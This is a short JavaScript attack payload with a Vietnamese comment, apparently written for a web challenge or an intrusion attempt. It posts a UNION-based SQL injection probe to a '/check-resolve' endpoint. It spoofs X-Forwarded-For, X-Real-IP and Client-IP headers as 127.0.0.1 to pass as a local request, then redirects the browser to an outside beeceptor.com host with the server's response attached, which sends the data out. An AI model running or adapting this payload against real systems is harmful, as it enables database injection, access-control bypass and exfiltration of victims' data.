let formData = new URLSearchParams();

// Nhét thử một chuỗi ký tự bình thường xem Backend có chịu in ra không
formData.append('id', '-1 UNION SELECT "KHANH_TEST"');

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    window.location = 'https://khanh.free.beeceptor.com/?result=' + encodeURIComponent(data);
});